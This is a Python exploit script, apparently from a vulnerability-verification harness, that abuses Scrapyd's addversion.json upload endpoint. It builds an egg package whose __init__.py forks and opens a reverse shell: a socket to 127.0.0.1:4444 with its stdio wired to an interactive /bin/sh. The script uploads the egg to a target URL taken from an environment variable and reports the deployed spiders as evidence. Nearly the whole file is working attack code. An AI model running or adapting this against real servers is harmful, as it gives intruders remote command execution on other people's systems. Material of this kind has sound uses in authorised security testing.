#!/usr/bin/env python3
"""Upload a Scrapyd egg whose project import starts a reverse shell."""

import io
import json
import os
import secrets
import urllib.parse
import urllib.request
import zipfile


def build_egg() -> bytes:
    package_init = (
        "import os, socket\n"
        "if os.fork() == 0:\n"
        "    sock = socket.socket()\n"
        "    sock.connect(('127.0.0.1', 4444))\n"
        "    for descriptor in (0, 1, 2):\n"
        "        os.dup2(sock.fileno(), descriptor)\n"
        "    os.execl('/bin/sh', 'sh', '-i')\n"
    )
    files = {
        "EGG-INFO/PKG-INFO": "Metadata-Version: 1.2\nName: probe\nVersion: 1.0\n",
        "EGG-INFO/entry_points.txt": "[scrapy]\nsettings = probe.settings\n",
        "EGG-INFO/top_level.txt": "probe\n",
        "EGG-INFO/zip-safe": "\n",
        "probe/__init__.py": package_init,
        "probe/settings.py": (
            "BOT_NAME = 'probe'\nSPIDER_MODULES = ['probe.spiders']\n"
        ),
        "probe/spiders/__init__.py": "",
        "probe/spiders/example.py": (
            "try:\n"
            "    from scrapy import Spider\n"
            "except ImportError:\n"
            "    from scrapy.spider import BaseSpider as Spider\n"
            "class ExampleSpider(Spider):\n"
            "    name = 'example'\n"
        ),
    }
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def upload_egg(target: str, project: str, egg: bytes) -> dict[str, object]:
    boundary = "scrapyd" + secrets.token_hex(12)
    chunks = []
    for name, value in (("project", project), ("version", "v1")):
        chunks.append(
            f"--{boundary}\r\nContent-Disposition: form-data; "
            f'name="{name}"\r\n\r\n{value}\r\n'.encode()
        )
    chunks.extend([
        f"--{boundary}\r\nContent-Disposition: form-data; "
        'name="egg"; filename="probe.egg"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n".encode(),
        egg,
        f"\r\n--{boundary}--\r\n".encode(),
    ])
    request = urllib.request.Request(
        urllib.parse.urljoin(target + "/", "addversion.json"),
        data=b"".join(chunks),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    with urllib.request.urlopen(request, timeout=45) as response:
        return json.load(response)


def main() -> None:
    target = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    project = "probe" + secrets.token_hex(5)
    response = upload_egg(target, project, build_egg())
    if response.get("status") != "ok":
        raise RuntimeError(f"Scrapyd rejected egg: {str(response)[:500]}")
    print(json.dumps({
        "evidence_payload": {
            "project": project,
            "version": "v1",
            "spiders": response.get("spiders"),
        },
    }))


if __name__ == "__main__":
    main()
